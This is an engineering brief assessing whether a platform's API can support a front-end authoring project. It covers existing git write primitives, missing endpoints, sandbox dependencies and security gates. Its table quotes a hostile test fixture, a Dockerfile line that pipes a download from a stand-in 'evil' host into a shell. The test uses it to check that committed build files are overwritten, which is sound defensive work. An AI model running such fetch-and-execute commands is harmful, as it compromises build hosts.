# Authoring API brief — what a front end needs that does not exist yet

*Written 2026-09-19, after Rich asked whether the API is fleshed out enough for a separate
front-end project — the one a real faculty member would use — to be specced against. It compares
what §22, D23 and §17's Phase 3 ask for with the code at `43f0452`, and every claim in §2 and §3
was read or counted that day. **It is a brief, not a plan**: §6 lists the decisions that are
Rich's, and nothing here is approved.*

**The one-sentence answer: an app can be DEPLOYED through the API and cannot be CREATED through
it.** All 34 operations serve the delivery half of §22's journey and every one is proved by a
caller. Nothing in the contract can change a line of an app's code, or a line of its
`manifest.yaml`. As far as any API client is concerned, an app's source is whatever its starter
seeded, permanently.

---

## 1. Why this brief exists, and the spec's own answer

§17's Phase 3 row ends: **"The separate front-end project can now begin against a real, exercised
API."** Phase 3, not Phase 2 — and §21 already reserves `app.manifest.internal` for that project
while the reference console keeps `console.manifest.internal`. So the spec has always placed the
front-end project after the authoring surface exists; this brief exists because that surface has
never been costed, and because **some of it turns out not to need sandboxes at all.**

That is the finding worth acting on. §17 bundles authoring with sandboxes, and sandboxes are
blocked on **S5** — *"an agent inside a sandbox"*, deferred, unrun, and the spike §12 defers the
question of whether container-level isolation is adequate for sandboxes to. But **committing a
file to a git repository is not a sandbox operation, and neither is writing `manifest.yaml`.**
Those need no isolation answer, and they are most of what a front end needs to stop being a
read-only window onto somebody else's app.

---

## 2. What exists today — read from the code on 2026-09-19

**Far more than expected, and that is the headline.** The primitives are largely built; what is
missing is an HTTP surface over them.

| Primitive | State | Evidence |
|---|---|---|
| Commit files to a project's repo | **Built** — `SourceDriver.commitFiles` via `commitThroughWorktree` | `source/local-driver.ts:130`. Clones the bare repo into a throwaway worktree, writes, commits, pushes |
| **Path-escape refusal on write** | **Built and enforced** | `local-driver.ts:96` — `resolve()` then a `startsWith(work + sep)` check, refusing `SOURCE_PATH_ESCAPE`. A traversal is already impossible |
| Read a file at a commit | **Built** — `SourceDriver.readFile` | `git show <sha>:<path>`, returning `null` for a path not in the tree |
| Head commit, list branches, destroy repo | **Built** | `headCommit`, `listBranches`, `destroyRepository` |
| **D13 — an app cannot supply a build definition** | **Built, and TESTED WITH A HOSTILE FIXTURE** | `build/context.ts:136` writes the blueprint's files **after** the app tree is exported, so a committed `Dockerfile` is overwritten. `context.test.ts:117` is labelled *THE CONTROL* and commits `FROM attacker/image\nRUN curl evil \| sh` plus a public-registry `.npmrc`, then asserts neither survives |
| `exec` into a running container | **IMPLEMENTED IN BOTH DRIVERS — and called by nothing** | `Driver.exec(id, cmd, opts): ExecStream` at `runtime/driver.ts:346`; `containerExec` at `runtime/docker/exec.ts` (77 lines); the fake driver implements it too. Both report `supportsExec: true` |
| A sandbox `Environment` row | **Built** — every project has one from creation | `projects/repository.ts` creates all three kinds; `hostnameFor` allocates the sandbox hostname |
| Event stream | **Built and in the contract** | `streamProjectEvents` |
| Knowledge pack over the API (D25) | **Built** | `getKnowledgePack` — a BYO agent can already learn how to write a valid `manifest.yaml`. It just cannot then submit one |

---

## 3. What is missing, and what it is blocked on

### 3.1 No HTTP surface for any of the write primitives

**The contract has 34 operations: 23 `GET`, 9 `POST`, 2 `DELETE` and ZERO `PATCH` or `PUT`.**
Nothing in the API is editable. Counted from `packages/contract/openapi.json` at `1.0.0`.

There is **no repository reference anywhere in the contract** — `repositoryUrl`, `clone`, `gitUrl`
and `"repository"` each return **0 hits** in the whole document, and the `Project` representation
is `id, slug, blueprint, starter, owner, audience, createdAt, environments`. So a front end cannot
even tell a faculty member where their code lives, let alone change it. The bare repos sit on the
laptop's filesystem under `reposRoot`; **nothing serves git over HTTP**, so a developer with shell
access can push and a network client cannot.

**`validateSpec` reads, it does not write.** Its own description: *"reads manifest.yaml at the
commit (HEAD by default), validates it (§7) and records the result."* The spec comes from the
repository, so even the one resource that looks writable is not.

### 3.2 Three real gaps in the write primitive itself

Found by reading `commitThroughWorktree`, and each would bite a plan rather than a brief:

1. **There is no way to DELETE a file.** `commitFiles` writes and `git add -A` stages, but nothing
   removes. An agent refactoring an app — renaming a module, dropping a file — cannot express it.
2. **Binary files are impossible.** `SeedFiles` is `Readonly<Record<string, string>>` written as
   `utf8`. No image, font or PDF can ever reach a repo. Faculty apps will want at least one image.
3. **There is no file LISTING.** `readFile` needs a path you already know and `listBranches` lists
   branches. Nothing enumerates a tree, so a front end cannot render a file browser, and an agent
   cannot discover what it is editing without being told.

### 3.3 `exec` is implemented, untested by the contract suite, and has no caller

The driver contract suite — the thing that makes a driver trustworthy — **does not exercise
`exec`**. Its only mention is `expect(typeof caps.supportsExec).toBe('boolean')`
(`driver-contract.ts:289`), which asserts the *capability flag is a boolean* and nothing about the
behaviour. So `exec` is 77 lines that both drivers claim to support, that nothing calls, and that
no contract test drives. **That is precisely the shape ORIENTATION §9 names four times** — and it
means nobody should treat `exec` as working until something proves it does.

### 3.4 What genuinely needs S5, and what does not

**This is the split the brief exists to make.**

| Wanted | Needs S5? | Why |
|---|---|---|
| Read a file, list a tree, commit files, delete files | **No** | Git operations in the control plane. No container runs |
| Write `manifest.yaml` and validate it | **No** | Same, plus §7 validation that already exists |
| A repository reference on `Project` | **No** | A representation field |
| Preview a branch / a sandbox deploy | **Probably not** | It is an ordinary deploy to an environment that already exists, on the internal listener |
| **`exec` into a sandbox** | **YES** | Running agent-authored commands is the isolation question S5 owns |
| **A sandbox with a TTL running agent code** | **YES** | D1's `sandbox` lifetime, and §12 defers its adequacy to S5 |
| `AgentSession`, per-session LiteLLM keys (D2, D8) | **Partly** | The table does not exist — **zero hits** for `AgentSession` in `src/`. The AI key machinery does exist (`ai/`) |
| MCP server (§22's third reference client) | **No, but** | It is a client of whatever the API offers, so it wants the authoring surface first |

**So a useful slice of Phase 3 can be pulled forward without touching S5 at all**: everything in
the first four rows. That slice is what would let a front-end project design against a real API
instead of an imagined one.

---

## 4. The security argument, which is better than expected

A write API for app source sounds alarming. Measured, most of the defence is already standing:

- **Build-time RCE is closed and tested.** D13's ordering overwrites any committed `Dockerfile` or
  `.npmrc`, and the test that proves it uses a genuinely hostile fixture. This is the control the
  whole idea rests on and it is the one control that already exists.
- **Path traversal is closed** at the write path, with its own error code.
- **The agent already cannot mutate anything outside its project** — D24's token is scoped to one
  project, and D14's privileged four are refused centrally.
- **Egress is default-deny in every environment** (D18), so authored code cannot phone home.

What a write API **changes**, and this is the part to take seriously:

- **It makes D9's sensitive-diff gate load-bearing for the first time.** Today nothing can change
  `manifest.yaml` through the API, so the re-escalation path has never had to stop a hostile
  change. The moment an agent can write that file, it can request new `auth.attributes`, new
  `egress.allow`, new `services`, a different `data.classification` or a different model — five of
  §7's seven sensitive fields. **P6b builds that gate.** This is a genuine ordering dependency:
  the authoring API should not ship before the escalation it depends on, or it ships with the
  gate's first real test being a live one.
- **It widens §13's accepted residual risk.** The gate reviews `manifest.yaml`, not code, and an
  authoring API is precisely a machine for producing unreviewed code faster. **D33's `Reviewer`
  seam was added on 2026-09-19 for exactly this trajectory**, and an authoring API is the strongest
  argument yet for putting a real implementation behind it.

---

## 5. Honest size

**8–14 tasks** for the no-S5 slice (§3.4's first four rows), at this project's grain: the three
write-primitive gaps, a file/tree read surface, the repository reference, the spec write path with
its validation, the capability and authorization work, console affordances to satisfy D22's
coverage gate, and an acceptance. The sandbox half is a separate plan and is S5's to unblock.

The defect-rate prior is **7.6 to 8.9 findings per task** across the last three plans, and this
one adds a write path to a system that has only ever had reads — which is the kind of first that
has produced this project's worst discoveries.

---

## 6. Decisions that are Rich's

Nothing below is decided.

1. **Does the no-S5 authoring slice become its own plan, and where does it sit?** It is not in the
   roadmap at all today — Phase 3 bundles it with sandboxes. Options: a new plan between P6 and
   P7; a Phase 2 addition; or left in Phase 3 and the front-end project waits.
2. **Does it ship before or after P6b?** §4's argument says after — P6b's sensitive-diff gate is
   what makes a spec write path safe — but that is a sequencing call with a real cost either way.
3. **Do binary files matter for v1?** Supporting them changes `SeedFiles` from
   `Record<string, string>` to something content-typed, and touches every seeding path. Saying
   "text only in v1" is defensible and should be a decision rather than an accident.
4. **Should the front-end project be specced against the slice, or wait for sandboxes too?** A
   front end can do a great deal with authoring and no `exec`; whether that is the product Rich
   wants specced is his.
5. **Does S5 get scheduled?** It blocks the sandbox half entirely, it is unrun, and Phase 3 cannot
   start without it. Nothing else in the project is waiting on a spike.

---

## 7. What to do first, whatever is decided

**Run the measurements before writing tasks**, as every plan since P4c has. The three worth buying:

- **Does `exec` actually work?** It is implemented, uncalled and uncovered by the contract suite.
  Drive it once against a real container before any plan depends on it.
- **What does `git add -A` do with a deletion?** The delete gap in §3.2 may be one line or may be
  a rework of the worktree function; nobody has tried.
- **What does the build context do with a very large or very deep tree?** The write path has no
  file-count or size limit at all, and the builder's bounds were measured by S1 for *concurrency
  and cache*, not for a tree an agent can grow without limit.
